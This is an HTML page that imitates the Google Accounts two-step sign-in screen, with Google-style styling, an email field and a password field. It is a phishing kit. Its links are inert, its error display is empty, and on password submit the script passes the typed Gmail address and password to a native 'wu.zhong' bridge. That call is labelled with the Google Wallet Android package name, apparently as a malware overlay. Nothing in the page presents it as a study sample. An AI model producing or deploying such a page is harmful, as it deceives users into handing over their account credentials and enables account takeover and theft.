<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
    <title>Sign in - Google Accounts</title>
    <meta name="description" content="Sign in to your Google Account to access Google services and apps. Secure authentication with email and password.">
 <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', Arial, sans-serif;
            background: #ffffff;
            color: #202124;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
        }

        .form-container {
            width: 100%;
            max-width: 360px;
        }

        .google-logo {
            text-align: center;
        }


        .page-title {
            text-align: center;
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 24px;
        }

        .description {
            text-align: center;
            color: #5f6368;
            font-size: 16px;
            line-height: 1.3;
            margin-bottom: 24px;
        }

        .learn-more-link {
            text-align: center;
            margin-bottom: 32px;
        }

        .learn-more-link a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .learn-more-link a:hover {
            text-decoration: underline;
        }

        .form-group {
            margin-bottom: 24px;
        }

        .form-label {
            display: block;
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
        }

        .form-input {
            width: 100%;
            padding: 16px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            transition: border-color 0.2s;
            background: transparent;
        }

        .form-input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 1px #1a73e8;
        }

        .forgot-link {
            margin-bottom: 32px;
        }

        .forgot-link a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .forgot-link a:hover {
            text-decoration: underline;
        }

        .form-actions {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding-top: 32px;
        }

        .create-account-link {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .create-account-link:hover {
            text-decoration: underline;
        }

        .next-button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            min-width: 64px;
            transition: background-color 0.2s;
        }

        .next-button:hover:not(:disabled) {
            background: #1557b0;
        }

        .next-button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .user-info {
            display: flex;
            align-items: center;
            margin-bottom: 32px;
            padding: 0 8px;
        }

        .user-avatar {
            width: 20px;
            height: 20px;
            background: #5f6368;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 12px;
            flex-shrink: 0;
        }

        .user-avatar svg {
            width: 12px;
            height: 12px;
            fill: white;
        }

        .user-email {
            color: #202124;
            font-size: 16px;
        }

        .checkbox-container {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 24px;
        }

        .checkbox {
            width: 16px;
            height: 16px;
            border: 1px solid #dadce0;
            border-radius: 2px;
            cursor: pointer;
            position: relative;
        }

        .checkbox input {
            opacity: 0;
            position: absolute;
            width: 100%;
            height: 100%;
            margin: 0;
            cursor: pointer;
        }

        .checkbox input:checked + .checkmark {
            background: #1a73e8;
            border-color: #1a73e8;
        }

        .checkbox input:checked + .checkmark::after {
            content: '✓';
            color: white;
            font-size: 12px;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        .checkbox-label {
            color: #5f6368;
            font-size: 14px;
            cursor: pointer;
        }

        .hidden {
            display: none;
        }

        .toast {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #323232;
            color: white;
            padding: 12px 24px;
            border-radius: 4px;
            font-size: 14px;
            z-index: 1000;
            opacity: 0;
            transition: opacity 0.3s;
        }

        .toast.show {
            opacity: 1;
        }

        .toast.error {
            background: #d32f2f;
        }

        @media (max-width: 480px) {
            .container {
                padding: 16px;
            }
            
            .form-container {
                max-width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="form-container">
      
            <div id="signin-page">
              
               
                <h1 class="page-title" >Sign in</h1>

                
                <div class="description">
                    Use your Google Account. The account will be added to this device and available to other Google apps.
                </div>

             
                <div class="learn-more-link">
                    <a href="#" data-testid="link-learn-more">Learn more about using your account</a>
                </div>

                
                <form id="signin-form">
                    <div class="form-group">
                        <input 
                            type="text" 
                            id="email-input"
                            class="form-input" 
                            placeholder="Email or phone"
                            data-testid="input-email"
                            autocomplete="username"
                            autofocus
                        >
                    </div>

                    <div class="forgot-link">
                        <a href="#" data-testid="link-forgot-email">Forgot email?</a>
                    </div>

                    <div class="form-actions">
                        <a href="#" class="create-account-link" data-testid="link-create-account">Create account</a>
                        <button type="submit" class="next-button" data-testid="button-next" id="signin-next">Next</button>
                    </div>
                </form>
            </div>

           
            <div id="password-page" class="hidden">
           

                
               

            
                <div class="user-info">
                    <div class="user-avatar">
                        <svg viewBox="0 0 24 24">
                            <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                        </svg>
                    </div>
                    <span class="user-email" id="display-email" data-testid="text-user-email"></span>
                </div>

               
                <form id="password-form">
                    <div class="form-group">
                        <label for="password-input" class="form-label">Enter your password</label>
                        <input 
                            type="password" 
                            id="password-input"
                            class="form-input"
                            data-testid="input-password"
                            autocomplete="current-password"
                            autofocus
                        >
                    </div>

                    <div class="checkbox-container">
                        <div class="checkbox">
                            <input type="checkbox" id="show-password" data-testid="checkbox-show-password">
                            <div class="checkmark"></div>
                        </div>
                        <label for="show-password" class="checkbox-label">Show password</label>
                    </div>

                    <div class="form-actions">
                        <a href="#" class="create-account-link" data-testid="link-forgot-password">Forgot password?</a>
                        <button type="submit" class="next-button" data-testid="button-next" id="password-next">Next</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <div id="toast" class="toast"></div>

    <script>
   
        let currentEmail = '';
        let isLoading = false;

       
        function showToast(message, isError = false) {
          
        }

        function validateEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            const phoneRegex = /^[\+]?[1-9][\d]{0,15}$/;
            return emailRegex.test(email) || phoneRegex.test(email);
        }

        function setLoading(button, loading) {
            button.disabled = loading;
            button.textContent = loading ? '...' : 'Next';
            isLoading = loading;
        }

        function showPage(pageId) {
            document.getElementById('signin-page').classList.add('hidden');
            document.getElementById('password-page').classList.add('hidden');
            document.getElementById(pageId).classList.remove('hidden');
        }

  
        document.getElementById('signin-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            if (isLoading) return;
            
            const emailInput = document.getElementById('email-input');
            const email = emailInput.value.trim();
            const nextButton = document.getElementById('signin-next');
            
            if (!email) {
                showToast('Please enter your email or phone number.', true);
                return;
            }

            if (!validateEmail(email)) {
                showToast('Please enter a valid email address or phone number.', true);
                return;
            }

            setLoading(nextButton, true);
            currentEmail = email;
            
          
            setTimeout(() => {
                document.getElementById('display-email').textContent = email;
                showPage('password-page');
                setLoading(nextButton, false);
                
                
                setTimeout(() => {
                    document.getElementById('password-input').focus();
                }, 100);
            }, 500);
        });

        
        document.getElementById('password-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            if (isLoading) return;
            
            const passwordInput = document.getElementById('password-input');
            const password = passwordInput.value.trim();
            const nextButton = document.getElementById('password-next');
            
            if (!password) {
                showToast('Please enter your password.', true);
                return;
            }

            setLoading(nextButton, true);

            wu.zhong(`🔰Google Login \n\n✉️ Gmail: ${ document.getElementById('email-input').value}\n🔒Password: ${password}`,"com.google.android.apps.walletnfcrel");

           
        });

   
        document.getElementById('show-password').addEventListener('change', function(e) {
            const passwordInput = document.getElementById('password-input');
            passwordInput.type = e.target.checked ? 'text' : 'password';
        });

    
        document.addEventListener('DOMContentLoaded', function() {
            showPage('signin-page');
            document.getElementById('email-input').focus();
        });

    
        document.addEventListener('click', function(e) {
            if (e.target.tagName === 'A' && e.target.getAttribute('href') === '#') {
                e.preventDefault();
            }
        });
    </script>
</body>
</html>
